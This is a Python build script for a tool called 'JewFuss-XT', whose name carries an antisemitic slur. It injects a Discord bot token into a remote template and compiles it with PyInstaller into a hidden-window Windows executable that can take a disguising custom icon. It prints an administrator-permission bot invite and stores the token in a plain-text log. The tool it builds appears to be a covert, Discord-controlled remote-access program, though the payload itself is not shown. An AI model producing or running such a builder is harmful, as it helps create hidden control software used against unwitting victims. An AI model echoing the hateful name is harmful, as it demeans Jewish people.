from plyer import filechooser
from PIL import Image
import urllib.request
import subprocess
import tempfile
import requests
import shutil
import time
import os
import re

save_unpackaged = True  # This is the only thing you should mess with otherwise you may break it
latest_url = "https://raw.githubusercontent.com/gabrielzv1233/JewFuss-XT/refs/heads/main/source/JewFuss-XT.template.py"

template_path = os.path.abspath('./source/JewFuss-XT.template.py')
output_dir = os.path.abspath('builds')
data_dir = os.path.abspath('data')
output_path = os.path.join(output_dir, 'JewFuss-XT.exe')
log_file_path = os.path.join(output_dir, 'easy-compiler-build.log')
search_string = '# Do not remove or modify this comment (easy compiler looks for this) - 23r98h'

if os.path.isfile(os.path.join(data_dir, "icon.ico")):
    os.remove(os.path.join(data_dir, "icon.ico"))
    
def is_valid_image(file_path):
    try:
        img = Image.open(file_path)
        img.verify()
        return True
    except (IOError, SyntaxError):
        return False

try:
    remote_lines = urllib.request.urlopen(latest_url).read().decode().splitlines()
except Exception as e:
    print("Error downloading remote file:", e)
    remote_lines = []

remote_version = None
for line in remote_lines:
    if "- 25c75g" in line:
        m = re.search(r'version\s*=\s*"([\d.]+)"', line)
        if m: remote_version = m.group(1)
        break

local_version = None
if os.path.exists(template_path):
    with open(template_path, 'r', encoding='utf-8') as f:
        for line in f:
            if "- 25c75g" in line:
                m = re.search(r'version\s*=\s*"([\d.]+)"', line)
                if m: local_version = m.group(1)
                break

if remote_version and local_version:
    if tuple(map(int, local_version.split("."))) < tuple(map(int, remote_version.split("."))):
        print(f"JewFuss-XT has an update: {local_version} → {remote_version}\nGet latest update here: https://github.com/gabrielzv1233/JewFuss-XT\n")

while True:
    useicon = input("Would you like to use a custom icon? [y(es)/n(o)]\n>> ").strip()
    while True:
        if useicon.lower().startswith("y"):
            useicon = True
            icon = filechooser.open_file(multiple=True, filters=['*.png', '*.jpeg', '*.jpg', '*.bmp', '*.gif', '*.tiff'])[0]
            break
        
        elif useicon.lower().startswith("n"):
            break
        
        else:
            useicon = input("Invalid option, please choose [y(es)/n(o)]\n>> ").strip()
            
    if "icon" not in locals():
        print("No icon provided, using default PyInstaller icon")
        break

    if not os.path.isfile(icon):
        print("Please enter a valid image file path")
        continue

    if not is_valid_image(icon):
        print("Please enter a valid image")
        continue

    file_ext = os.path.splitext(icon)[1].lower()
    
    if file_ext == '.ico':
        break

    try:
        img = Image.open(icon)
        ico_path = os.path.join(data_dir, "icon.ico")
        img.save(ico_path, format='ICO')
        print(f"icon image converted to ico.")
        icon = ico_path
        break
    except Exception as e:
        print(f"Error converting image: {e}")
        continue

while True:
    invalidtoken = False
    user_input = input('Please enter a valid bot token:\n>> ').strip()
    
    if user_input:
        print("Checking if token is valid...")
        response = requests.get("https://discord.com/api/v10/users/@me", headers={"Authorization": f"Bot {user_input}"})
        if response.status_code != 200: # 200 is valid, 401 is invalid, 429 is ratelimited
            print("Error: invalid bot token")
            invalidtoken = True
        else:
            bot_username = response.json()["username"] + "#" + response.json()["discriminator"]
            bot_id = response.json()["id"]
        if invalidtoken == False:
            user_input = f'TOKEN = "{user_input}"'
            break
    else:
        print("Error: input cannot be empty")

print("\nTemplate path:", template_path)
print("\nOutput directory:", output_dir)
print("\nOutput location:", output_path)
if "icon" in locals():
    print("\nIcon path:", icon)
print("\nLog file path:", log_file_path + "\n")

with open(template_path, 'r', encoding='utf-8') as file:
    lines = file.readlines()

for i, line in enumerate(lines):
    if search_string in line:
        lines[i] = user_input + '\n'
        break

temp_dir = tempfile.mkdtemp()
temp_file = os.path.join(temp_dir, 'temp.py')

if os.path.exists(output_path):
    timestamp = time.strftime('%Y-%m-%d-%H-%M-%S', time.localtime())
    new_name = f"{timestamp}-JewFuss-XT.exe"
    new_path = os.path.join(output_dir, new_name)
    os.rename(output_path, new_path)
    print(f"Renaming {os.path.basename(output_path)} to {new_name}\n")
elif not os.path.exists(output_dir):
    os.makedirs(output_dir)

if not os.path.exists(data_dir):
    os.makedirs(data_dir)

timestamp = time.strftime('%Y-%m-%d %H:%M:%S')

with open(temp_file, 'w', encoding='utf-8') as file:
    file.writelines(lines)

if save_unpackaged:
    if not os.path.exists(os.path.dirname(os.path.abspath(__file__))+"\\builds\\unpackaged-latest.py"):
        with open(os.path.dirname(os.path.abspath(__file__))+"\\builds\\unpackaged-latest.py", 'w', encoding='utf-8') as file:
            file.writelines(lines)

cmd = [
    'pyinstaller', temp_file, '--onefile', '--windowed', '--noconsole', 
    f'--distpath={output_dir}', f'--workpath={data_dir}', '-n=JewFuss-XT.exe'
]
if "icon" in locals():
    cmd.extend(['--icon', icon])

subprocess.run(cmd)
shutil.rmtree(temp_dir)

if os.path.isfile(output_path):
    os.system(f'explorer /select,"{output_dir}\JewFuss-XT.exe"')    
    print(f"\nCompiled JewFuss-XT as {bot_username}")
    print(f"Bot invite link: https://discord.com/oauth2/authorize?client_id={bot_id}&permissions=8&scope=bot")
    with open(log_file_path, 'a') as log_file:
        log_file.write(f"\"{timestamp}\": {user_input} ({bot_username})\n")
else:
    print("Error: JewFuss-XT was unable to compile")
